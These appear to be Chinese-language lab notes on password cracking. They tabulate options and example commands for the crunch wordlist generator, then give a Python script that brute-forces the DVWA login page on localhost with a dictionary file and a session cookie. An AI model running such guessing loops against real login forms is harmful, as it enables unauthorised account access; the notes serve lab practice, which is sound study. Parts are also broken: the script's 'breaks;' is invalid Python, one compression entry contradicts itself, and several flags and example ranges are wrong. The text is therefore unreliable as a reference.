| 参数 | 说明 |
|------|------|
| `-b` | 指定文件输出的大小，避免字典文件过大 |
| `-c` | 指定文件输出的行数，即包含密码的个数 |
| `-d` | 限制相同元素出现的次数 |
| `-e` | 定义停止字符，即到该字符串就停止生成 |
| `-f` | 调用库文件（`/usr/share/crunch/charset.lst`） |
| `-i` | 改变输出格式，即 `aaa,aab -> aaa,baa` |
| `-l` | 通常与 `-t` 联合使用，表明该字符为实义字符 |
| `-m` | 通常与 `-p` 搭配。用 `-p` 替代 |
| `-o` | 将密码保存到指定文件 |
| `-p` | 生成不重复的字符串<br>必须放在最后<br>不能和 `-s` 一起使用<br>会忽略最小长度和最大长度 |
| `-q` | 读取密码文件，即读取 `pass.txt` |
| `-r` | 定义从某一字符串重新开始 |
| `-s` | 指定一个开始的字符，即从自己定义的密码 `xxxx` 开始 |
| `-t` | 指定密码输出的格式<br>`@` 小写字母<br>`,` 大写字母<br>`%` 数字<br>`^` 字符 |
| `-u` | 禁止打印百分比（必须为最后一个选项） |
| `-z` | 压缩生成的字典文件，支持 `gzip`, `bzip2`, `lzma`, `7z`<br>`gzip` 压缩最快但是最慢，`7z` 压缩最慢但是体积最小 |

| 命令 | 解释 |
|------|------|
| `crunch 1 8` | 第一个是 a，最后一个是 zzzzzzzz |
| `crunch 1 6 abcdefg` | 第一个是 a，最后一个是 gggggg |
| `crunch 1 6 abcdefg\` | 第一个是 a，最后一个是 6 个空格<br>也可以写成 `"abcdefg "` |
| `crunch 1 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt` | 第一个是 a，最后一个是 8 个空格<br>`/usr/share/crunch/charset.lst` |
| `crunch 8 8 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt -t @@dog@@@ -s cbdogaaa` | 从 cbdogaaa 开始，到 `" dog "` 结束 |
| `crunch 2 3 -f charset.lst ualpha -s BB` | BB 开始，ZZZ 结束 |
| `crunch 4 5 -p abc` | （排列组合）生成 abc, acb, bac, bca, cab, cba<br>这个时候数字无用 |
| `crunch 4 5 -p dog cat bird` | （排列组合）生成 birdcatdog, birddogcat, catbirddog,<br>catdogbird, dogbirdcat, dogcatbird |
| `crunch 1 5 -o START -c 6000 -z bzip2` | 每个 txt 文件包含 6000 个单词，用 bzip2 压缩文件名：<br>`first_word-last_word.txt.bz2bzip2`<br>`-d` 解压 |
| `crunch 4 5 -b 20mib -o START` | 生成 `aaaaa-gvfed.txt`, `gvfee-ombqy.txt`, `ombqz-wcydt.txt`,<br>`wcydu-zzzzz.txt` 每个文件呢 20M，最后一个是实际大小 |
| `crunch 3 3 abc + 123 !@# -t @%@^` | 3 位长度，格式：小写、数字、字符内容顺序：小写、大写、数字、符号<br>大写在格式中不包括，用 `+` 占位小写包含：<br>`abc` 数字包含：`123` 符号包含：`!@#` 从 `a1!` 开始，`c3#` 结束 |
| `crunch 3 3 abc + 123 !@# -t ^%@` | 格式：字符、数字、小写字母 |
| `crunch 4 4 + + 123 + -t %%@^` | 4 位，格式：数字、数字、小写字母、字符<br>内容顺序：小写、大写、数字、符号<br>除了数字只有 `123` 以外，其他的都不限制<br>从 `11a!` 开始到 `33z` 结束 |
| `crunch 5 5 -t ddd@@ -o j -p dog cat bird` | 从 `birdcatdogaa` 开始到 `dogcatbirdzz` 结束 |
| `crunch 7 7 -t p@ss,%^ -1 a@aaaaa` | 格式：`p@ss` 大写数字符号 `@` 小写字母，大写字母 `%` 数字 `^` 字符 `-1`<br>表明该字符为实义字符<br>从 `p@ssA0!` 开始到 `p@ssZ9` 结束 |
| `crunch 5 5 -s @4#S2 -t @%^,2 -e @8 Q2 -1 @dddd -b 10KB -o START` | `-s` 起始字符 `-e` 结束字符<br>格式：`@` 数字符号大写 `2` 从 `@4#S2` 开始，到 `@8 Q2` 结束<br>（注：有空格要加双引号） |
| `crunch 5 5 -d 2@ -t @@%%` | 从 `aab00` 到 `zzy99` `-d` 限制相同元素出现的次数 |
| `crunch 10 10 -t @@%^%%^^ -d 2@ -d 3% -b 20mb -o START 11 -h` | 从 `aab!0001!!` 开始到 `zzy 9998`<br>结束每个文件 20M |
| `crunch 8 8 -d 2@` | 从 `aabaabaa` 到 `zzyzyzyz` |
| `crunch 4 4 -f /usr/share/crunch/unicode_test.lst japanese -t @@%% -1 @xdd` | 从 `@00` 开始，到 `@語99` 结束<br>下载：<br>`https://github.com/jaalto/external-sf--crunch-wordlist` |
- ## Python暴力破解
  - ### 思路
    - #### 从字典读取值, 生成密码
    - #### HTTP连接到需要爆破的地址
    - #### 获取HTTP相应, 分析响应结果, 看看有没有错误提示
    - #### 如果有提示, 就继续下一步循环
    - #### 如果没有, 就代表爆破成功
  - ### 代码
```python
# 打开密码文件
pwds = open('password.txt')
for pwd in pwds:
  print(pwd)

pwds.close()

# 连接
import requests
## 如果第一个密码就提示成功, 是 PHPSESSID 没有替换的原因
pwds = open('password.txt')
for pwd in pwds:
  url1 = 'http://localhost/dvwa/vulnerabilities/brute/'
  ## PHPSESSID 务必替换为登录以后的 PHPSESSID
  resp = requests.get(url = url1, params = {'username': 'admin', 'password': pwd.strip(), 'Login': 'Login'}, headers = {'Cookie': 'security = low; PHPSESSID = 你自己的值'})
  # print(resp.text)
  if 'Username and/or password incorrect.' in resp.text:
    print('破解失败: ' + pwd, end = '')
  else:
    print('破解成功: ' + pwd, end = '')
    breaks;
pwds.close()
```
